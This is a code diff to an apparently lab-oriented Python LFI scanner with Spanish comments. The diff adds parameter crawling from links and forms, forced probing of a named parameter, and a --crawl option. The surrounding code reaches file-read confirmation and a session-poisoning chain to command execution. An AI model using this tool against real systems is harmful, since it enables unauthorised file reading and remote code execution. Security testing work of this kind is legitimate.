@@ -175,6 +175,29 @@ def detect_waf(target, timeout=8):
     return False
 
 
+LINK_RE = re.compile(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', re.I)
+INPUT_RE = re.compile(r'name\s*=\s*["\']([^"\']+)["\']', re.I)
+PARAM_NAME_RE = re.compile(r"[A-Za-z0-9_\-\[\]]{1,40}")
+
+
+def crawl_params(target, timeout=8):
+    """Saca nombres de parametro de los enlaces y formularios de la propia pagina."""
+    st, body, _, err = fetch(target, timeout)
+    if st is None:
+        return []
+    text = body.decode(errors="replace")
+    names = []
+    for attr in LINK_RE.findall(text):
+        query = urllib.parse.urlsplit(urllib.parse.urljoin(target, attr)).query
+        for key, _ in urllib.parse.parse_qsl(query, keep_blank_values=True):
+            if key and key not in names:
+                names.append(key)
+    for key in INPUT_RE.findall(text):
+        if key and key not in names:
+            names.append(key)
+    return [n for n in names if PARAM_NAME_RE.fullmatch(n)]
+
+
 def check_probe(kind, body):
     """Devuelve (confirmado, detalle) para un payload concreto."""
     text = body.decode(errors="replace")
@@ -201,7 +224,7 @@ def print_kv(label, value):
     print(f"    {label:<34} {value}")
 
 
-def scan(target, param=None, timeout=8):
+def scan(target, param=None, timeout=8, candidates=None):
     """Fase 1-3. Devuelve (param_vulnerable, informe)."""
     print(f"[*] Objetivo: {target}")
     st, body, ms, err = fetch(target, timeout)
@@ -213,7 +236,7 @@ def scan(target, param=None, timeout=8):
     print_kv("baseline (inicio)", base_txt)
     print()
 
-    candidates = [param] if param else CANDIDATE_PARAMS
+    candidates = [param] if param else (candidates or CANDIDATE_PARAMS)
     print(f"[*] Fase 2: probando {len(candidates)} parametro(s) candidatos")
 
     suspects = []
@@ -231,6 +254,11 @@ def scan(target, param=None, timeout=8):
             print(f"  [!!] {c:<12} firma: {hits[0]!r}")
         elif notable:
             print(f"  [ ?] {c:<12} respuesta distinta (len {len2} vs {base_len})")
+
+    if param and not suspects:
+        print(f"  [!] '{param}' no dio firma de include (errores ocultos?); "
+              f"probando lectura igualmente")
+        suspects.append((param, "forzado por --param", ""))
 
     print()
     print("[*] Fase 3: confirmacion de lectura de ficheros")
@@ -277,8 +305,13 @@ def scan(target, param=None, timeout=8):
         for p in vulnerable:
             print(f"    - {p[2]}: {p[3]}")
     elif suspects:
-        print("[!] Hay senales de include pero sin lectura confirmada "
-              "(posible allowlist, sufijo forzado u open_basedir).")
+        forced = param and any(s[1].startswith("forzado") for s in suspects)
+        if forced:
+            print(f"[!] '{param}' no leyo ningun fichero de prueba. O no es el parametro, "
+                  "o hay prefijo/sufijo, allowlist u open_basedir.")
+        else:
+            print("[!] Hay senales de include pero sin lectura confirmada "
+                  "(posible allowlist, sufijo forzado u open_basedir).")
     else:
         print("[-] No se detecto LFI con las sondas usadas (no significa que no exista).")
 
@@ -486,7 +519,7 @@ def resolve_target(value):
     raise SystemExit(f"[!] No entiendo '{value}'. Usa A..G, CENTOS, un puerto o una URL.")
 
 
-def run_scenario(target, param, session_paths, cmd, session_name, timeout):
+def run_scenario(target, param, session_paths, cmd, session_name, timeout, crawl=False):
     """Ejecuta fases 0-5 en silencio y devuelve lo esencial (para --diff)."""
     result = {"target": target, "waf": False, "param": None, "rce": None,
               "post": {}, "log": ""}
@@ -494,8 +527,14 @@ def run_scenario(target, param, session_paths, cmd, session_name, timeout):
     try:
         with contextlib.redirect_stdout(buf):
             result["waf"] = detect_waf(target, timeout)
-            found = scan(target, param, timeout)
-            effective = found or param
+            candidates = None
+            if crawl:
+                found = crawl_params(target, timeout)
+                candidates = found + [c for c in CANDIDATE_PARAMS if c not in found]
+                print(f"[*] Parametros encontrados en la pagina: "
+                      f"{', '.join(found) or '(ninguno)'}")
+            found_param = scan(target, param, timeout, candidates)
+            effective = found_param or param
             result["param"] = effective
             if effective:
                 sess = chain(target, effective, session_name, session_paths,
@@ -619,6 +658,8 @@ def main():
     ap.add_argument("--session-name", default="PHPSESSID", help="nombre de la cookie de sesion")
     ap.add_argument("--session-path", action="append",
                     help="ruta(s) de sesiones a probar (se pueden repetir); por defecto, lista comun")
+    ap.add_argument("--crawl", action="store_true",
+                    help="sacar nombres de parametro de los enlaces/formularios de la pagina")
     ap.add_argument("--diff", nargs=2, metavar=("A", "B"),
                     help="comparar el impacto en dos objetivos (A..G, CENTOS, puerto o URL); "
                          "implica --chain --post")
@@ -643,8 +684,10 @@ def main():
         (url_a, name_a), (url_b, name_b) = (resolve_target(v) for v in args.diff)
         param = args.param
         paths = args.session_path or SESSION_PATHS
-        res_a = run_scenario(url_a, param, paths, args.cmd, args.session_name, args.timeout)
-        res_b = run_scenario(url_b, param, paths, args.cmd, args.session_name, args.timeout)
+        res_a = run_scenario(url_a, param, paths, args.cmd, args.session_name,
+                             args.timeout, args.crawl)
+        res_b = run_scenario(url_b, param, paths, args.cmd, args.session_name,
+                             args.timeout, args.crawl)
         if args.diff_log:
             for tag, res, name in (("A", res_a, name_a), ("B", res_b, name_b)):
                 print("=" * 84)
@@ -663,7 +706,14 @@ def main():
 
     detect_waf(args.target, args.timeout)
     print()
-    param = scan(args.target, args.param, args.timeout)
+    candidates = None
+    if args.crawl:
+        found = crawl_params(args.target, args.timeout)
+        print(f"[*] Parametros encontrados en la pagina ({len(found)}): "
+              f"{', '.join(found[:25]) or '(ninguno)'}")
+        print()
+        candidates = found + [c for c in CANDIDATE_PARAMS if c not in found]
+    param = scan(args.target, args.param, args.timeout, candidates)
     if args.chain:
         # Si el usuario indico --param, se respeta aunque la confirmacion falle
         # (p.ej. un WAF bloquea las sondas pero la app sigue siendo vulnerable).
